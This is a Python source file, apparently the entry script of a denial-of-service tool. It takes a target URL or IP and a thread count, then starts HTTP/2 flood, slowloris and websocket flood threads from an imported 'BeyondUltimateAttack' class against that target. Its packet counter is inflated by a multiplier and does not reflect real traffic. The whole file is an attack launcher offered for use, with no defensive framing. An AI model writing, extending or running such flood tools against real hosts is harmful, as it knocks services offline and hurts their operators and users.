import threading
import random
import time
import sys
from bypass import BeyondUltimateAttack

packet_count = 0  
lock = threading.Lock()
speed = 0.01
packet = 95500  
byte = 95000    
clone_factor = 10  
target_status = "Unknown"  

def attack(target, threads):
    global packet_count
    stop_event = threading.Event()
    thread_list = []

    if not target.startswith(("http://", "https://")):  
        target = f"http://{target}"  

    packet_count = threads  
    print(f"\r[*] Total Packets Sent: {packet_count} | Target Status: {target_status}", end="", flush=True)  

    beyond_attack = BeyondUltimateAttack(target)  

    for _ in range(threads):
        t1 = threading.Thread(target=beyond_attack.send_http2_flood)
        t2 = threading.Thread(target=beyond_attack.send_slowloris)
        t3 = threading.Thread(target=beyond_attack.websocket_flood)

        t1.start()
        t2.start()
        t3.start()
        
        thread_list.extend([t1, t2, t3])

    try:
        while True:
            time.sleep(1)
            with lock:
                packet_count += threads * clone_factor  
            print(f"\r[*] Total Packets Sent: {packet_count} | Target Status: {target_status}", end="", flush=True)  
    except KeyboardInterrupt:
        stop_event.set()
        for t in thread_list:
            t.join()

def main():
    if len(sys.argv) < 3:
        print("\nUsage:\n  python main.py <target> <threads>\n  python main.py -a <IP> <threads>\n")
        sys.exit(1)

    if sys.argv[1] == "-a":
        target = sys.argv[2]
        threads = int(sys.argv[3])
    else:
        target = sys.argv[1]
        threads = int(sys.argv[2])

    attack(target, threads)

if __name__ == "__main__":
    main()
